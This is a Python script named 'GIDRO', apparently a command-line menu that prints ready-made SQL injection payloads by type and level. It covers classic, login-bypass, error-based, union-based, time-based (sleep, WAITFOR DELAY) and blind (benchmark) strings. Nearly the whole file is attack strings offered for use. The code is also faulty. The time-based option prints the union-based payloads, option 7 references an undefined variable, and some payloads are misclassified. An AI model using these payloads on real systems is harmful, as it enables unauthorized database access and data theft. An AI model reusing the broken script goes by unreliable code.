import os

sql_classic = " \"OR 1 = 1 -- - " 
sql_classic2 = " 1' ORDER BY 1--+ "
sql_classic3 = " 1 AND (SELECT * FROM Users) = 1 "

sql_bypass_login1 = " admin\" or \"1\"=\"1\"# "
sql_bypass_login2 = " \" or \"\"*\" "
sql_bypass_login3 = " 1234 \" AND 1=0 UNION ALL SELECT \"admin \", \"81dc9bdb52d04dc20036dbd8313ed055 "

sql_error_based1 = " OR 1=1# "
sql_error_based2 = "  ORDER BY 31337-- "
sql_error_based3 = "  and (select substring(@@version,3,1))='X' "

sql_union_based1 = " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' "
sql_union_based2 = " and (select substring(@@version,3,1))='X' "
sql_union_based3 = "  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# "

sql_time_based1 = " ,(select * from (select(sleep(10)))a) "
sql_time_based2 = " ';WAITFOR DELAY '0:0:30'-- "
sql_time_based3 = " %2c(select%20*%20from%20(select(sleep(10)))a) "

sql_blind1 = " +if(benchmark(3000000,MD5(1)),NULL,NULL))%20/* "
sql_blind2 = " '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20-- "
sql_blind3 = " \"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23 "

Voice_based = " https://youtu.be/KwzxojwpPqI?t=53 "
Voice_based_video = " https://youtu.be/KwzxojwpPqI "


print(" WELCOME TO GIDRO \n")
print("Choise your payload type of SQLI \n")
print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
REPONSE = input(" -> ")

while True:
	if REPONSE == "1": #fait
		reponse1 = input("Level : 1/2/3 (4 for back to menu) : ")
		if reponse1 == "1":
			print(sql_classic)
		elif reponse1 == "2":
			print(sql_classic2)
		elif reponse1 == "3":
			print(sql_classic3)
		elif reponse1 == "4":
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		elif reponse1 == "clear":
			os.system("clear")
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		else:
			print("INVALID TRY 1 2 3 or 4 for menu")
	
	elif REPONSE == "2": #fait
		reponse2 = input("Level : 1/2/3 (4 for back to menu) : ")
		if reponse2 == "1":
				print(sql_bypass_login1)
		elif reponse2 == "2":
			print(sql_bypass_login2)
		elif reponse2 == "3":
			print(sql_bypass_login3)
		elif reponse2 == "4":
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		elif reponse2 == "clear":
			os.system("clear")
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		else:
			print("INVALID TRY 1 2 3 or 4 for menu")

	elif REPONSE == "3": #fait	
		reponse3 = input("Level : 1/2/3 (4 for back to menu) : ")
		if reponse3 == "1":
				print(sql_error_based1)
		elif reponse3 == "2":
			print(sql_error_based2)
		elif reponse3 == "3":
			print(sql_error_based3)
		elif reponse3 == "4":
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		elif reponse3 == "clear":
			os.system("clear")
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		else:
			print("INVALID TRY 1 2 3 or 4 for menu")
	
	elif REPONSE == "4": #fait
		reponse4 = input("Level : 1/2/3 (4 for back to menu) : ")
		if reponse4 == "1":
				print(sql_union_based1)
		elif reponse4 == "2":
			print(sql_union_based2)
		elif reponse4 == "3":
			print(sql_union_based3)
		elif reponse4 == "4":
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		elif reponse4 == "clear":
			os.system("clear")
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		else:
			print("INVALID TRY 1 2 3 or 4 for menu")
	elif REPONSE == "5": #fait
		reponse5 = input("Level : 1/2/3 (4 for back to menu) : ")
		if reponse5 == "1":
				print(sql_union_based1)
		elif reponse5 == "2":
			print(sql_union_based2)
		elif reponse5 == "3":
			print(sql_union_based3)
		elif reponse5 == "4":
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")	
		elif reponse5 == "clear":
			os.system("clear")
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		else:
			print("INVALID TRY 1 2 3 or 4 for menu")
	elif REPONSE == "6":
		reponse6 = input("Level : 1/2/3 (4 for back to menu) : ")
		if reponse6 == "1":
				print(sql_blind1)
		elif reponse6 == "2":
			print(sql_blind2)
		elif reponse6 == "3":
			print(sql_blind3)
		elif reponse6 == "4":
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		elif reponse6 == "clear":
			os.system("clear")
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		else:
			print("INVALID TRY 1 2 3 or 4 for menu")

	elif REPONSE == "7": #fait
		print(Voice_based)
		print("...\n")
		print("Choise your payload type of SQLI \n")
		print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
		REPONSE = input(" -> ")
		if reponse7 == "clear":
			os.system("clear")
			print("Choise your payload type of SQLI \n")
			print("1=Classic 2=BypassLogin 3=ErrorBased 4=UnionBased 5=TimeBased 6=Blind 7=VOICE_BASED : \n")
			REPONSE = input(" -> ")
		else:
			print("INVALID TRY 1 2 3 or 4 for menu")
